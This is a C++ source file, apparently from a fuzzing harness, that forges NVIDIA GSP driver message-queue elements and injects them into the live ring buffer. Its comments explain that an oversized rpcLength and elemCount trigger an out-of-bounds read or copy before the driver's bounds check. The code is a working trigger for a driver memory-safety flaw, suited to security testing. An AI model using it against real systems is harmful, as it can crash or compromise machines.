#include "gpu_instrumentation.h"
#include "utilities.h"
#include <algorithm>
#include <cerrno>
#include <cstdint>
#include <cstring>
#include <optional>
#include <vector>

namespace
{
constexpr std::uint32_t FORGED_RPC_VERSION{0x03000000};
constexpr std::uint32_t FORGED_RPC_SIGNATURE{0x43505256};

constexpr std::uint64_t ELEM_RPCVERSION_OFF{48};
constexpr std::uint64_t ELEM_RPCSIGNATURE_OFF{52};
constexpr std::uint64_t ELEM_RPCFUNCTION_OFF{60};

void putU32(std::vector<std::uint8_t>& buf, const std::uint64_t offset,
	    const std::uint32_t value)
{
	const auto bytes{u32ToBuf(value)};
	std::memcpy(buf.data() + offset, bytes.data(), bytes.size());
}

//
// _checkSum32 XORs the span as NvU64s and folds to 32 bits. The span covers the
// checkSum field itself, which is why storing the checksum of the zeroed
// element makes the driver's total come out zero.
//
std::uint32_t computeChecksum(const std::vector<std::uint8_t>& buf,
			      const std::size_t span)
{
	std::uint64_t sum{0};
	for (std::size_t i = 0; i + 8 <= span; i += 8) {
		std::uint64_t w;
		std::memcpy(&w, buf.data() + i, 8);
		sum ^= w;
	}
	return static_cast<std::uint32_t>(sum >> 32) ^
	       static_cast<std::uint32_t>(sum);
}

//
// Element 0 of a message: elemCount is the trusted bound the copy loop uses;
// seqNum and the checksum only decide whether the driver accepts the message
// after the oversized copy has already happened, i.e. whether the queue
// survives for the next attempt.
//
std::vector<std::uint8_t> makeHeaderElement(const std::uint32_t msgLength,
					    const std::uint32_t rxSeqNum,
					    const std::uint32_t rpcFunction,
					    const std::uint32_t rpcLength)
{
	std::vector<std::uint8_t> element(GspMsgQueue::ELEM_SIZE_MIN, 0);

	putU32(element, GspMsgQueue::ELEM_SEQNUM_OFF, rxSeqNum);
	putU32(element, GspMsgQueue::ELEM_ELEMCOUNT_OFF, msgLength);
	putU32(element, ELEM_RPCVERSION_OFF, FORGED_RPC_VERSION);
	putU32(element, ELEM_RPCSIGNATURE_OFF, FORGED_RPC_SIGNATURE);
	putU32(element, GspMsgQueue::ELEM_RPCLENGTH_OFF, rpcLength);
	putU32(element, ELEM_RPCFUNCTION_OFF, rpcFunction);

	//
	// The driver checksums GSP_MSG_QUEUE_ELEMENT_HDR_SIZE + rpc.length
	// (message_queue_cpu.c:745) before it bounds-checks that sum
	// (message_queue_cpu.c:825), so an oversized rpcLength is the point of
	// several of these values. Clamp only our own span - reproducing the
	// driver's read here would walk the same distance off the end of this
	// 4096-byte vector. The stored checksum is then wrong for those values
	// and the driver rejects the message, but only after the read.
	//
	const std::uint64_t span{
	    std::min<std::uint64_t>(GspMsgQueue::ELEM_HDR_SIZE + rpcLength,
				    element.size())};
	putU32(element, GspMsgQueue::ELEM_CHECKSUM_OFF,
	       computeChecksum(element, span));

	return element;
}
} // namespace

int setElemcount(const std::uint64_t slotOffset, const std::uint32_t elemCount)
{
	const GspMsgQueue::Layout* const layout{ensureGspReady()};
	if (layout == nullptr) {
		return -1;
	}

	//
	// slotOffset is relative to the live read cursor, not an absolute ring
	// index. Only the element at readPtr bounds the next copy loop, and
	// readPtr moves at runtime, so an absolute index would hit the
	// interesting slot 1-in-msgCount of the time and could never be learned
	// by the fuzzer. As an offset the case that matters is 0.
	//
	const auto readPtr{injectorReadMemoryU32(layout->readPtrOffset())};
	if (!readPtr) {
		errno = EIO;
		return -1;
	}

	const std::uint32_t slot{
	    static_cast<std::uint32_t>((*readPtr + slotOffset) % layout->msgCount)};

	if (!injectorWriteMemoryU32(layout->elementOffset(slot) +
					GspMsgQueue::ELEM_ELEMCOUNT_OFF,
				    elemCount)) {
		errno = EIO;
		return -1;
	}

	return 0;
}

int insertPayload(std::uint8_t* buffer, const std::uint32_t bufferSize,
		  const std::uint32_t rpcFunction, const std::uint32_t rpcLength)
{
	const GspMsgQueue::Layout* const layout{ensureGspReady()};
	if (layout == nullptr) {
		return -1;
	}

	if (buffer == nullptr || bufferSize == 0 ||
	    bufferSize % GspMsgQueue::ELEM_SIZE_MIN != 0) {
		errno = EINVAL;
		return -1;
	}

	// One header element plus one element per body page.
	const std::uint32_t msgLength{
	    static_cast<std::uint32_t>(bufferSize / GspMsgQueue::ELEM_SIZE_MIN) +
	    1};
	if (msgLength > layout->msgCount) {
		errno = EINVAL;
		return -1;
	}

	const auto readPtr{awaitIdleReadPtr(*layout)};
	if (!readPtr) {
		errno = EBUSY;
		return -1;
	}

	const auto info{getGspMsgQueueInfo()};
	if (!info) {
		errno = ENODEV;
		return -1;
	}

	//
	// One ioctl per contiguous run, not one per element: the write window is
	// the time the ring is held open against a live readPtr.
	//
	std::vector<std::uint8_t> message{makeHeaderElement(
	    msgLength, info->rxSeqNum, rpcFunction, rpcLength)};
	message.resize(static_cast<std::size_t>(msgLength) *
		       GspMsgQueue::ELEM_SIZE_MIN);
	std::memcpy(message.data() + GspMsgQueue::ELEM_SIZE_MIN, buffer,
		    bufferSize);

	// Split at the ring wrap; elementOffset is only contiguous up to msgCount.
	const std::uint32_t firstRun{
	    std::min(msgLength, layout->msgCount - *readPtr)};
	const std::size_t firstBytes{static_cast<std::size_t>(firstRun) *
				     GspMsgQueue::ELEM_SIZE_MIN};

	if (!injectorWriteMemory(
		layout->elementOffset(*readPtr),
		std::vector<std::uint8_t>(message.begin(),
					  message.begin() + firstBytes))) {
		errno = EIO;
		return -1;
	}
	if (firstRun < msgLength &&
	    !injectorWriteMemory(
		layout->elementOffset(0),
		std::vector<std::uint8_t>(message.begin() + firstBytes,
					  message.end()))) {
		errno = EIO;
		return -1;
	}

	//
	// A readPtr that moved during the write puts the forged writePtr below
	// behind the driver's live cursor, which wraps rxAvail to nearly
	// msgCount. Bailing out here leaves the elements unavailable and the ring
	// intact.
	//
	const auto readPtrNow{injectorReadMemoryU32(layout->readPtrOffset())};
	if (!readPtrNow) {
		errno = EIO;
		return -1;
	}
	if (*readPtrNow != *readPtr) {
		errno = EAGAIN;
		return -1;
	}

	//
	// Delivery. rxAvail is derived from writePtr against the driver's live
	// read cursor, so without this the elements are never available and the
	// copy loop breaks out at "Incomplete read" instead of overflowing.
	//
	const std::uint32_t newWritePtr{(*readPtr + msgLength) %
					layout->msgCount};
	if (!injectorWriteMemoryU32(layout->writePtrOffset(), newWritePtr)) {
		errno = EIO;
		return -1;
	}

	return 0;
}
